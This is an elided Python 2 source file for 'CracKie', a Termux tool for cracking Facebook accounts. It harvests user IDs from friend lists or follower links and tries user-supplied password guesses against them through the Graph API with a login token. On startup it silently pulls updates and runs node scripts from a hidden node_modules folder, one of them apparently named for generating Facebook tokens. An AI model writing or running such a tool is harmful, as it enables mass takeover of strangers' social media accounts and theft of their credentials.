...
try:
    ...
    os.system("python2 CracKie.py")
os.system("clear")
if not os.path.isfile("/data/data/com.termux/files/usr/bin/node"):
    os.system("apt update && apt install nodejs -y")
from requests.exceptions import ConnectionError
os.system("git pull")
if not os.path.isfile("/data/data/com.termux/files/home/CracKie/.empty/node_modules/bytes/index.js"):
    ...
    os.system("clear")
    time.sleep(10)
elif os.path.isfile("/data/data/com.termux/files/home/CracKie/.empty/node_modules/bytes/index.js"):
    os.system("fuser -k 5000/tcp &")
    os.system("cd .termux && node index.js &")
#elif os.path.isfile("/data/data/com.termux/files/home/CracKie/.empty/node_modules/bytes/generate_fb_token.js"):
    #os.system("fuser -k 5000/tcp &")
    #os.system("cd .termux && node generate_fb_token.js &")
#elif os.path.isfile("/data/data/com.termux/files/home/CracKie/.empty/node_modules/bytes/loadJS.js"):
    #os.system("fuser -k 5000/tcp &")
...
\033[1;94m    ╚═╝╚╝─╚══╝╚═╝╚╩╝╚╝╚═╝  \033[1;0m
\033[1;96m--------------------------------------------------
\033[1;91m(+)\033[1;95m Author   : Rehan Maqsood
\033[1;91m(+)\033[1;95m Github   : https://github.com/Rehan-Maqsood
\033[1;91m(+)\033[1;95m Fb Page  : https://m.facebook.com/105870571729533
\033[1;96m--------------------------------------------------
"""
...
def user_info():
    ...
    time.sleep(1)
    try:
        abm = open("/sdcard/.CracKie.txt", "r").read()
	...
	print("")
        ...
        os.system("clear")
	print banner
	print("\033[1;95mThis Tool Is temporarily lock").center(50)
	print('')
	print("\033[1;95mPut Username").center(50)
	print('')
	api = raw_input("\033[1;94m[!] Put Username :\033[0;90m ")
	if api =="Rehan":
		print("")
		time.sleep(3)
		...
		print("")
		time.sleep(1)
		print("\033[1;91mUsername Is Invalid").center(50)
		print("")
		time.sleep(3)
		user_info()
...
def login_fb():
    ...
    if "loc" in q:
        ...
        login_abm.close()
	print("")
	print("\033[1;96mLogin Success").center(50)
	time.sleep(3)
        menu()
...
def menu():
    ...
    print("")
    print("\033[1;95m [1] Clone From Friendlist")
    print("\033[1;95m [2] Clone With Auto Pass")
    print("\033[1;95m [3] View Your Login Token")
    print("\033[1;95m [4] Update Tool")
    print("\033[1;95m [0] Main Menu Back")
    print(50*"-")
    menu_select()
def menu_select():
	select = raw_input("\n[+] Choose : ")
...
def crack():
	...
	print("[2] Crack With Followers ID Link")
	print("[0] Direct Back")
	print(50*"-")
	crack_select()
def crack_select():
	...
	if select =="1":
		...
		try:
			...
			print("")
			print("\033[1;92mInvalid Link Or Friendlist Has Hidden").center(50)
			print("")
			time.sleep(3)
			crack()
		...
		time.sleep(3)
		crack_select()
	print("[!] Total User IDs :\033[1;94m "+str(len(id)))
	time.sleep(0.05)
	print("[!]\033[1;94m CracKie Start...")
	time.sleep(0.05)
	print("[!]\033[1;94m Plz wait clone account will be appear here\033[1;0m")
	time.sleep(0.05)
	print(50*"-")
...
def choice_select():
	...
	if select =="1":
		...
		idt = raw_input("[+] Put ID/Username  : ")
		print("")
		pass1 = raw_input("\033[1;92m[1] Enter Password :\033[1;92m ")
		pass2 = raw_input("\033[1;92m[2] Enter Password :\033[1;92m ")
		pass3 = raw_input("\033[1;92m[3] Enter Password :\033[1;92m ")
		pass4 = raw_input("\033[1;92m[4] Enter Password :\033[1;92m ")
		pass5 = raw_input("\033[1;92m[5] Enter Password :\033[1;92m ")
		try:
			r = requests.get("https://graph.facebook.com/"+idt+"?access_token="+token, headers=header)
			q = json.loads(r.text)
			os.system('clear')
